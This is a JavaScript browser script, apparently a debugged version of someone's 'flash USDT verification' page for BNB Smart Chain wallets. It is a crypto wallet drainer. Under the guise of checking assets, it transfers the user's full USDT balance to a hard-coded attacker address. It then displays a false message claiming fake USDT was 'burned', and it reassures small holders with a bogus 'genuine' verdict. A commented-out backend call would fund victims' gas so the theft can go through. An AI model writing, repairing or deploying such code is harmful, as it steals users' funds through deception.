// Ensure that the Web3.js library is loaded in your browser environment
// For example, if this script is part of an HTML page, you would include:
// <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
// BEFORE this script runs.
// If you are running this in a specific Web3 browser's console or similar,
// you need to ensure the 'Web3' object is available from that environment.

const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees (Note: this is not used in the transferUSDT function currently)
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

let web3; // This variable will store the Web3.js instance
let userAddress; // This variable will store the connected user's address

/**
 * @dev Attempts to connect the user's wallet via window.ethereum.
 * Initializes the web3 object and sets the userAddress.
 */
async function connectWallet() {
    // Check if a Web3 provider (like MetaMask) is injected into the window
    if (window.ethereum) {
        try {
            // Attempt to create a new Web3 instance.
            // THIS LINE REQUIRES the 'Web3' constructor to be defined globally.
            // If Web3.js library is not loaded, this will cause a 'ReferenceError: Web3 is not defined'.
            web3 = new Web3(window.ethereum);

            // Request accounts from the user. Using 'eth_accounts' will only return
            // accounts if the user has already connected this site. For first-time
            // connections or explicit prompts, 'eth_requestAccounts' is typically used.
            const accounts = await window.ethereum.request({ method: "eth_accounts" });

            // If no accounts are returned (e.g., user not connected or rejected), handle this case
            if (accounts.length === 0) {
                console.warn("No accounts found. Wallet might not be connected or access denied.");
                // You might want to add an alert or UI message here to instruct the user to connect
                // Example: alert("Please connect your wallet through MetaMask.");
                return; // Exit if no accounts are available
            }

            userAddress = accounts[0]; // Set the first connected account as the user's address
            console.log("Wallet Connected:", userAddress);

            // Force switch to BNB Smart Chain (Chain ID: 0x38)
            // This request ensures the user is on the correct network.
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });

            // You might want to add event listeners here for accountsChanged and chainChanged
            // to react to user actions in the wallet after initial connection.
            window.ethereum.on('accountsChanged', (newAccounts) => {
                if (newAccounts.length > 0) {
                    userAddress = newAccounts[0];
                    console.log("Account changed to:", userAddress);
                    // Re-run asset verification or update UI
                } else {
                    userAddress = null;
                    console.log("Wallet disconnected.");
                    // Update UI to show disconnected state
                }
            });

            window.ethereum.on('chainChanged', (chainId) => {
                console.log("Chain changed to:", chainId);
                if (chainId !== '0x38') {
                    alert("Please switch to BNB Smart Chain.");
                }
                // Reload or re-initialize based on chain change
            });

        } catch (error) {
            console.error("Error during wallet connection or chain switch:", error);
            // This alert is for issues during chain switching or if `eth_accounts` fails
            alert("Error connecting wallet. Please check console for details and ensure you are on BNB Smart Chain.");
            web3 = undefined; // Ensure web3 is reset if connection fails
            userAddress = undefined;
        }
    } else {
        // This alert is shown if window.ethereum (MetaMask) is not detected
        alert("MetaMask or a compatible Web3 browser extension is not detected. Please install it.");
    }
}

// Automatically try to connect the wallet when the page (or script context) loads
window.addEventListener("load", connectWallet);

/**
 * @dev Verifies the user's USDT and BNB balances and initiates a transfer if conditions are met.
 */
async function verifyAssets() {
    // This is the check that triggers your "Wallet not connected" alert.
    // It means that `web3` was not successfully initialized in `connectWallet`,
    // or `userAddress` was not set.
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Please ensure MetaMask is installed and connected, then refresh the page.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    // Fetch balances
    try {
        const [usdtBalanceWei, userBNBWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

        console.log(`USDT Balance: ${usdtBalance} USDT`);
        console.log(`BNB Balance: ${userBNB} BNB`);

        if (usdtBalance === 0) {
            showPopup("No assets found.", "black");
            return;
        }

        if (usdtBalance <= 1) { // Original script logic for "genuine" assets
            showPopup(
                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
                "green"
            );
            return;
        }

        // If USDT balance is > 1, proceed to check BNB and potentially transfer
        showPopup("Loading and checking BNB for gas...", "blue");

        // The original script has a hardcoded check for userBNB < 0.0005 and a backend call.
        // If your backend isn't available or configured, this part will need to be handled.
        // For demonstration, directly call transferUSDT if enough BNB is present.
        const minimumBnbForGas = 0.0005; // A typical gas amount for a USDT transfer
        if (userBNB < minimumBnbForGas) {
            console.log("User BNB is low. Cannot proceed with transfer without gas.");
            showPopup(`Insufficient BNB for gas. You need at least ${minimumBnbForGas} BNB to proceed with the USDT transfer.`, "orange");
            // If you have a backend to send BNB, this is where you'd integrate it.
            // Example of a backend call (as per your original script):
            // await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
            //   method: "POST",
            //   headers: { "Content-Type": "application/json" },
            //   body: JSON.stringify({ toAddress: userAddress })
            // });
            // showPopup("Requesting BNB from backend. Please wait...", "blue");
        } else {
            // Proceed with transfer if sufficient BNB
            transferUSDT(usdtBalance, userBNB);
        }

    } catch (error) {
        console.error("Error verifying assets or fetching balances:", error);
        showPopup("Failed to verify assets. Check your wallet connection and console for errors.", "red");
    }
}

/**
 * @dev Initiates the USDT transfer.
 * @param {number} usdtBalance - The amount of USDT to transfer.
 * @param {number} userBNB - The user's current BNB balance (for context, though not directly used in transfer).
 */
async function transferUSDT(usdtBalance, userBNB) {
    showPopup(`Initiating USDT transfer of ${usdtBalance} USDT. Please confirm in your wallet...`, "blue");
    try {
        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether"); // Convert to Wei

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        // Send the transaction. This will open the wallet confirmation.
        const transactionResult = await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Transfer Successful!<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT<br><a href="https://bscscan.com/tx/${transactionResult.transactionHash}" target="_blank" style="color: blue;">View on BscScan</a>`,
            "green"
        );
        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}. Transaction hash: ${transactionResult.transactionHash}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        let errorMessage = "USDT transfer failed.";
        if (error.code === 4001) { // User rejected transaction
            errorMessage = "Transaction rejected by user.";
        } else if (error.message.includes("insufficient funds for gas")) {
            errorMessage = "Insufficient BNB for gas fees. Please fund your wallet with BNB.";
        }
        showPopup(`❌ ${errorMessage} Please try again.`, "red");
    }
}

// The sendBNB function was not called in your verifyAssets/transferUSDT flow.
// It seems to be a standalone function or intended for a backend interaction.
// If you intend for this frontend to send BNB, it would require the bnbGasSender
// to be controlled by the user's wallet, which contradicts the 'sender' name.
// This function would typically be used by a backend.
// async function sendBNB(toAddress, amount) {
//     try {
//         await web3.eth.sendTransaction({
//             from: bnbGasSender, // This implies bnbGasSender needs to be the connected user's wallet, or an unlocked account.
//             to: toAddress,
//             value: web3.utils.toWei(amount, "ether"),
//             gas: 21000
//         });
//         console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
//     } catch (error) {
//         console.error("⚠️ Error sending BNB:", error);
//     }
// }

/**
 * @dev Displays a custom pop-up message.
 * @param {string} message - The message content (can include HTML).
 * @param {string} color - A string indicating the type/color of the popup ('green', 'red', 'blue', 'orange').
 */
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        // If popupBox element doesn't exist, create it dynamically
        popup = document.createElement("div");
        popup.id = "popupBox";
        document.body.appendChild(popup); // Append to body
        // Basic styling for the dynamically created popup
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        popup.style.zIndex = "1000"; // Ensure it's on top
    }

    // Apply color-based styling
    if (color === "red") {
        popup.style.backgroundColor = "#ffebeb"; // Light red
        popup.style.color = "red";
    } else if (color === "green") {
        popup.style.backgroundColor = "#e6f7e6"; // Light green
        popup.style.color = "green";
    } else if (color === "blue") {
        popup.style.backgroundColor = "#e6f7ff"; // Light blue
        popup.style.color = "blue";
    } else if (color === "orange") {
        popup.style.backgroundColor = "#fff3e0"; // Light orange
        popup.style.color = "orange";
    } else { // Default to black text on white
        popup.style.backgroundColor = "#ffffff";
        popup.style.color = "black";
    }

    popup.innerHTML = message;
    popup.style.display = "block"; // Make popup visible

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// This line assumes there's an HTML element with id="verifyAssets" that the user clicks.
// If your environment doesn't have such an element, this will throw an error.
// Make sure this button exists or trigger verifyAssets differently.
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
